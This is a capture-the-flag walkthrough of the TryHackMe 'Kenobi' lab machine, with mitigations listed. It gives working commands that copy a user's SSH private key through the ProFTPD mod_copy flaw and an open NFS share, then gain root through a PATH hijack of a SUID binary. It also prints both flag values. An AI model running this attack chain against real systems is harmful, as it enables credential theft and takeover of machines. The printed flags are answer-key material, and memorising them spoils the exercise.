# Kenobi CTF Walkthrough

**Target:** Kenobi  
**Source:** [TryHackMe](https://tryhackme.com/room/kenobi)  
**Difficulty:** Easy  
**Target IP:** 10.48.134.62

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Enumerating Samba](#enumerating-samba)
- [Gain Initial Access](#gain-initial-access)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

Kenobi is an easy-difficulty CTF challenge focused on Linux exploitation. The attack chain covers three core techniques: enumerating Samba shares to gather information, exploiting a vulnerable ProFTPD instance using the `mod_copy` module to exfiltrate an SSH private key via an exposed NFS share, and finally escalating to root by hijacking the PATH of a custom SUID binary.

**Key Skills Required:**
- Network scanning and service enumeration
- SMB/NFS enumeration
- Manual FTP exploit (mod_copy / SITE CPFR & CPTO)
- SUID binary analysis with `strings`
- Linux PATH variable manipulation for privilege escalation

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -Pn -T4 10.48.134.62
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | ProFTPD 1.3.5 |
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | http | Apache httpd 2.4.41 |
| 111/tcp | rpcbind | 2-4 (RPC #100000) |
| 139/tcp | netbios-ssn | Samba smbd 4 |
| 445/tcp | netbios-ssn | Samba smbd 4 |
| 2049/tcp | nfs | 3-4 (RPC #100003) |

**Ports open:** `7`

---

## Enumerating Samba

### SMB Share Enumeration

```bash
enum4linux -a 10.48.134.62
```

**Shares found:** `3`

### Browsing the Anonymous Share

```bash
smbclient //10.48.134.62/anonymous
```

```
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Sat Aug  9 09:03:22 2025
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
```

**File visible:** `log.txt`

Download the file for analysis:

```bash
smbget -a smb://10.48.134.62/anonymous
```

**FTP port:** `21`

### NFS Mount Enumeration

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.134.62
```

**Key finding:**

```
| nfs-showmount:
|_  /var *
```

**Visible NFS mount:** `/var`

---

## Gain Initial Access

### ProFTPD Version & Exploit Discovery

The version was already identified from the nmap scan:

```
21/tcp open ftp ProFTPD 1.3.5
```

**ProFTPD version:** `1.3.5`

```bash
searchsploit proftpd 1.3.5
```

**Results:**

| Exploit Title | Path |
|---|---|
| ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb |
| ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | linux/remote/36803.py |
| ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py |
| ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt |

**Number of exploits:** `4`

### Exploiting mod_copy (SITE CPFR / SITE CPTO)

ProFTPD's `mod_copy` module allows unauthenticated users to copy files on the server using `SITE CPFR` (copy from) and `SITE CPTO` (copy to). Since `/var` is an NFS-mounted share accessible externally, we copy Kenobi's private key into it:

```bash
nc 10.48.134.62 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.48.134.62]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### Mounting the NFS Share and Retrieving the Key

```bash
mkdir /mnt/kenobiNFS
mount 10.48.134.62:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
```

### SSH Login as Kenobi

```bash
ssh -i id_rsa kenobi@10.48.134.62
```

**Result:** Successful login as `kenobi`.

---

## Privilege Escalation

### Finding SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Unusual result:**

```
/usr/bin/menu
```

**Answer:** `/usr/bin/menu`

### Inspecting the Binary

```bash
/usr/bin/menu
```

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

**Number of options:** `3`

```bash
strings /usr/bin/menu
```

Key lines in output:

```
curl -I localhost
uname -r
ifconfig
```

The binary calls `curl`, `uname`, and `ifconfig` **without absolute paths**. Since it runs with root privileges (SUID), we can inject a malicious `curl` into `$PATH`.

### PATH Hijack

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Select option `1` (status check → invokes `curl`):

```
** Enter your choice :1
# whoami
root
```

**Root shell obtained.**

---

## Flags

### User Flag

```bash
kenobi@kenobi:~$ cat user.txt
```

> `d0b0f3f53b6caa532a83915e19224899`

### Root Flag

```bash
# cat /root/root.txt
```

> `177b3cd8562289f37382721c28381f02`

---

## Flags Summary

| Flag | Value | Location |
|------|-------|----------|
| User Flag | `d0b0f3f53b6caa532a83915e19224899` | `/home/kenobi/user.txt` |
| Root Flag | `177b3cd8562289f37382721c28381f02` | `/root/root.txt` |

---

## Vulnerabilities

### 1. ProFTPD 1.3.5 mod_copy — Unauthenticated File Copy (High)

**CVE:** CVE-2015-3306

**Description:** The `mod_copy` module in ProFTPD 1.3.5 allows unauthenticated remote attackers to copy arbitrary files on the server using `SITE CPFR` and `SITE CPTO` commands. Combined with an exposed NFS share, this allowed exfiltration of a user's SSH private key without credentials.

**Impact:** Unauthenticated read/write of arbitrary files, leading to initial user access.

**Mitigation:**
- Upgrade ProFTPD to a patched version
- Disable the `mod_copy` module if not required
- Restrict FTP access to authenticated users only

### 2. NFS Share Exposed World-Wide (High)

**Description:** The `/var` directory was exported via NFS without host restrictions (`/var *`), making it accessible to any machine on the network.

**Impact:** Allowed the attacker to retrieve a file copied via the ProFTPD exploit, bridging two vulnerabilities into a full compromise.

**Mitigation:**
- Restrict NFS exports to specific trusted IP ranges
- Use `root_squash` and `nosuid` mount options
- Regularly audit `/etc/exports`

### 3. SUID Binary Using Relative Command Paths (High)

**Description:** The custom `/usr/bin/menu` binary runs as root (SUID) but invokes `curl`, `uname`, and `ifconfig` using relative paths. An attacker can place a malicious executable named `curl` earlier in `$PATH` to intercept execution.

**Impact:** Full privilege escalation from unprivileged user to root.

**Mitigation:**
- Always use absolute paths in scripts and binaries that run with elevated privileges
- Audit all custom SUID/SGID binaries
- Apply the principle of least privilege — avoid SUID where not necessary

### 4. Weak SSH Key Protection (Medium)

**Description:** Kenobi's SSH private key was stored at the default location (`~/.ssh/id_rsa`) with no additional passphrase protection, making it immediately usable once retrieved.

**Impact:** Instant SSH access upon key exfiltration.

**Mitigation:**
- Protect private keys with a strong passphrase
- Use SSH certificate authorities rather than user-managed key pairs

---

## Attack Chain Summary

```
Nmap scan → 7 open ports (FTP, SSH, HTTP, RPC, SMB x2, NFS)
    ↓
enum4linux → 3 SMB shares, anonymous share accessible
    ↓
smbclient → log.txt downloaded (confirms SSH key & NFS mount details)
    ↓
Nmap NFS scripts → /var exported to all hosts (*)
    ↓
searchsploit → ProFTPD 1.3.5 mod_copy (4 exploits found)
    ↓
Netcat → SITE CPFR /home/kenobi/.ssh/id_rsa
         SITE CPTO /var/tmp/id_rsa
    ↓
NFS mount of /var → id_rsa copied to attacker machine
    ↓
chmod 600 id_rsa → ssh -i id_rsa kenobi@10.48.134.62
    ↓
User flag captured → d0b0f3f53b6caa532a83915e19224899
    ↓
find SUID binaries → /usr/bin/menu identified
    ↓
strings /usr/bin/menu → curl called without absolute path
    ↓
PATH hijack: echo /bin/sh > /tmp/curl → export PATH=/tmp:$PATH
    ↓
/usr/bin/menu option 1 → root shell spawned
    ↓
Root flag captured → 177b3cd8562289f37382721c28381f02
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning, NFS enumeration (`nfs-ls`, `nfs-showmount`) |
| enum4linux | SMB share and user enumeration |
| smbclient / smbget | SMB share browsing and file download |
| Netcat (nc) | Manual ProFTPD mod_copy exploit via FTP commands |
| NFS (mount) | Mounting remote /var share to retrieve SSH key |
| strings | Inspecting SUID binary for relative command calls |
| PATH Hijacking | Privilege escalation via fake `curl` in /tmp |

---

## References

- [TryHackMe — Kenobi](https://tryhackme.com/room/kenobi)
- [CVE-2015-3306 — ProFTPD mod_copy](https://www.cve.org/CVERecord?id=CVE-2015-3306)
- [ProFTPD Advisory](http://www.proftpd.org/docs/NEWS-1.3.5a)
- [Nmap NSE Scripts — NFS](https://nmap.org/nsedoc/scripts/nfs-showmount.html)

---
